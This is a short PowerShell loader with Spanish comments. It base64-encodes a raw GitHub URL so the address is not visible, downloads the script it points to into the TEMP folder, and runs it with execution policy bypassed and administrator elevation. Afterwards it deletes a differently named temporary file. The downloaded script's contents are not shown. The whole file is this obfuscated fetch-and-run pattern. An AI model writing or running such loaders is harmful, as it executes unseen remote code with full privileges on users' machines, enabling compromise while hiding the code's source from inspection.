$enlaceCodificado = "aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0VkZ2FyZEphbWVuL1JFUEFSQU5ETzIwMjUvcmVmcy9oZWFkcy9tYWluL21lbnUucHMx"
$enlaceOriginal = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($enlaceCodificado))

Invoke-WebRequest -Uri $enlaceOriginal -OutFile "$env:TEMP\menu.ps1"
Start-Process -FilePath "powershell.exe" `
    -ArgumentList "-ExecutionPolicy Bypass -File $env:TEMP\menu.ps1" `
    -WindowStyle Normal -Verb RunAs
# Eliminar configtool.ps1 de la carpeta TEMP después de ejecutarse
$scriptPath = "$env:TEMP\configtool.ps1"
if (Test-Path $scriptPath) {
    Remove-Item -Path $scriptPath -Force -ErrorAction SilentlyContinue
}
